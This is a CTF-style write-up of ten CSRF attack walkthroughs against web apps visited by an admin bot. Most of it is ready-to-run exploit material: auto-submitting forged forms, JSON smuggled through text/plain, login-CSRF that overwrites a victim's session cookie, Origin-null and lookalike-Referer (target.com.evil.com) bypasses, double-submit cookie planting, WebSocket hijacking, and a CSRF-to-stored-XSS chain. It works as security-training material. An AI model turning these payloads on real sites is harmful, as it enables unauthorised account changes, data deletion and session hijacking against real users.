# Case studies — worked CSRF walkthroughs

End-to-end shapes, each grounded in the mechanism it demonstrates.
The literals are placeholders; the decision-tree transfers.

---

## Case 1 — the urlencoded profile write

```text
target: a profile-update endpoint POST /profile with fields
        (email, bio, theme). no CSRF token. cookie missing SameSite.
viewer: an admin-bot that visits a reported URL and holds an
        admin session.
```

```bash
# 1. the cookie read — missing SameSite → attaches on old-bot
curl -i -b "$CJ" "$BASE/profile" | grep -i 'set-cookie'
#    → Set-Cookie: session=... (no SameSite) — the bot's chromium
#      may treat it as Lax (modern) or None (old). test both.

# 2. the write — does a foreign-Origin replay work?
curl -i -b "$CJ" -X POST "$BASE/profile" -d 'bio=x' \
  -H 'Origin: https://evil.com'   → 200 — no Origin check

# 3. the delivery — a urlencoded form
#    <form action="/profile" method=POST>
#      <input name=bio value='<script>/*xss*/</script>'>
#    </form><script>document.forms[0].submit()</script>

# 4. the readback — the bio stored?
curl -s -b "$CJ" "$BASE/api/me" | grep -o '<script>'
```

The chain: CSRF writes a stored-XSS bio → the bot views the profile
→ the XSS runs → exfil. The CSRF is the delivery for the XSS.

## Case 2 — the JSON config write via text/plain (the card shape)

```text
target: POST /update takes JSON {"machine_id","action"}. gated by
        remote_ip==127.0.0.1. a bot visits your URL and IS localhost.
```

```bash
# 1. direct request → 403 Only localhost — the socket-peer gate
# 2. header spoof fails — X-Forwarded-For etc all ignored
# 3. the bot is the only local client → deliver via the bot
```

```html
<meta name=referrer content=no-referrer>
<form id=f action="http://127.0.0.1:1337/update" method=POST enctype=text/plain>
  <input name='{"machine_id":"host-x","ignore":"' value='"}'>
</form><script>f.submit()</script>
```

```bash
# 4. the readback — /stats lists the registered machine
curl -s "$BASE/stats" | grep -o 'host-x'
```

## Case 3 — the login-CSRF into a shared jar (the SSOS shape)

```text
target: an SSO login + a shared bot cookie jar. the bot's token
        cookie persists across cycles. missing SameSite.
```

```html
<form action="https://sso/login" method=POST enctype=text/plain>
  <input name='{"u":"me","p":"x","i":"' value='"}'>
</form><script>document.forms[0].submit()</script>
```

```bash
# the Set-Cookie from the CSRF'd login overwrites the jar's token
# → the bot's next action runs as YOUR session → it deposits the
#   flag into your account
curl -s -b "$MY_CJ" "$BASE/api/flag" | grep -oE 'FLAG\{[^}]+\}'
```

## Case 4 — the GET-write under Lax

```text
target: a delete-link GET /delete?id= that actually deletes. cookie
        SameSite=Lax. a top-level nav attaches the cookie.
```

```html
<!-- a top-nav GET — Lax attaches -->
<script>location='https://t/delete?id=123'</script>
<!-- or a meta-refresh, or a link the bot clicks -->
```

```bash
# the readback — the object gone
curl -s -b "$CJ" "$BASE/api/obj/123"   → 404 — deleted
```

## Case 5 — the token-strip open

```text
target: POST /change takes a csrf field but the server doesn't
        verify it. cookie SameSite=None.
```

```bash
# the csrf_probe token-strip → the stripped replay returns 200
python3 tools/web/csrf_probe.py --url "$BASE/change" --method POST \
  --body 'a=1&csrf=T' --token-field csrf
#    → as-sent 200, stripped 200 → the token is decorative
```

```html
<form action="/change" method=POST><input name=a value=1></form>
<!-- send the token field EMPTY or omit it entirely — it validates -->
```

## Case 6 — the absent-Origin bypass

```text
target: the check is 'if (!Origin) allow' — a missing Origin passes.
        a data: page's request carries Origin: null.
```

```html
<script>location='data:text/html,<form action="https://t/x" method=POST><input name=a value=1></form><script>document.forms[0].submit()<\/script>'</script>
<!-- the POST's Origin is 'null' — the absent-origin check opens -->
```

## Case 7 — the multipart upload write

```text
target: POST /upload takes a multipart file + a config field that
        gets JSON-parsed. cookie SameSite=None.
```

```html
<form action="/upload" method=POST enctype=multipart/form-data>
  <input name=cfg value='{"a":1}'>
  <input type=file name=f>
</form><script>document.forms[0].submit()</script>
```

## Case 8 — the substring-Referer bypass

```text
target: the check is referer.includes('target.com'). a CSRF page on
        https://target.com.evil.com passes the substring check.
```

```html
<!-- hosted on a subdomain-lookalike domain -->
<form action="https://t/x" method=POST><input name=a value=1></form>
<script>document.forms[0].submit()</script>
<!-- Referer: https://target.com.evil.com — contains 'target.com' -->
```

## Case 9 — the double-submit-cookie plant

```text
target: double-submit CSRF — cookie csrf must equal form csrf. a
        subdomain cookie-set plants the cookie.
```

```html
<img src="https://sub.t/set?cookie=csrf=x">   <!-- plant the cookie -->
<form action="/x" method=POST><input name=csrf value=x>
  <input name=a value=1></form>
<!-- cookie csrf=x == form csrf=x → validates -->
```

## Case 10 — the ws-hijack adjacency

```text
target: a wss:// channel that authenticates via the session cookie
        on the handshake — no per-message auth, no Origin check.
```

```js
var ws=new WebSocket('wss://t/ws');
ws.onopen=()=>ws.send(JSON.stringify({op:'delete',id:1}));
// cookies attach on the handshake — the ws-write fires cross-origin
```

## The pattern across all cases

```text
every case: identify the write → measure the gates → pick the
surviving carrier → deliver through the viewer → read back the state.
the mechanism transfers; the specific fields/endpoints are the
challenge's own.
```
